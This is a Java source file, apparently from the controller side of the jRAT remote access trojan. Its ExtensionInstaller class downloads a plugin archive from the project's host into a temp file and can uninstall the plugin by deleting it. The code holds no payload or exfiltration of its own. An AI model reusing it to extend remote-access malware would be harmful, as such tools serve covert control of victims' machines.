package pro.jrat.extensions;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

import com.redpois0n.common.utils.IOUtils;

import pro.jrat.Constants;
import pro.jrat.ErrorDialog;
import pro.jrat.net.WebRequest;

public class ExtensionInstaller {

	private OnlinePlugin plugin;

	public ExtensionInstaller(OnlinePlugin plugin) {
		this.plugin = plugin;
	}

	public void toggle() {
		try {
			if (plugin.isInstalled()) {
				uninstall();
			} else {
				install();
			}
		} catch (Exception e) {
			e.printStackTrace();
			ErrorDialog.create(e);
		}
	}

	public void uninstall() throws Exception  {
		plugin.getJar().delete();
		plugin.getDirectory().delete();
	}

	public void install() throws Exception  {
		InputStream archive = WebRequest.getInputStream(Constants.HOST + "/plugins/" + plugin.getName() + "/archive.zip");
		FileOutputStream out = new FileOutputStream(File.createTempFile(plugin.getName() + "_temp_download", ".zip"));
		
		IOUtils.copy(archive, out);
		
		archive.close();
		out.close();
	}

}
